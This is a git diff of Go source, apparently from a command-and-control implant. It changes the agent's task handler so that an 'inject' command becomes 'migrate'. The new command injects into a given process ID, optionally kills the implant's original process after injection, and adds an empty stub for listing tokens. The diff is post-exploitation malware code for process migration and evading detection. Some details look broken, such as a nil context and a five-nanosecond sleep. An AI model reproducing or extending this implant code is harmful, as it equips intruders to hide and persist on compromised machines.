@@ -289,8 +289,10 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			}
 
 			data = "created directory"
-		case "inject":
-			pid := taskData
+		case "migrate":
+			taskDataSplit := strings.Split(taskData, " -- ")
+			pid := taskDataSplit[0]
+			doClose := taskDataSplit[1]
 
 			procPath, err := hg.GetCurrentProcPath()
 			if err != nil {
@@ -316,7 +318,26 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 				break
 			}
 
+			// kill current process
+			go func() {
+				if doClose == "true" {
+					var ctx context.Context
+					procsWithCtx, _ := process.ProcessesWithContext(ctx)
+
+					for _, proc := range procsWithCtx {
+						if fmt.Sprint(proc.Pid) == fmt.Sprint(hg.GetCurrentPid()) {
+							time.Sleep(5)
+							proc.KillWithContext(ctx)
+						}
+					}
+				}
+			}()
+
 			data = fmt.Sprintf("successfully injected into process %s", pid)
+		case "tokens":
+			if taskData == "list" {
+
+			}
 		default:
 			data = "command not supported"
 		}
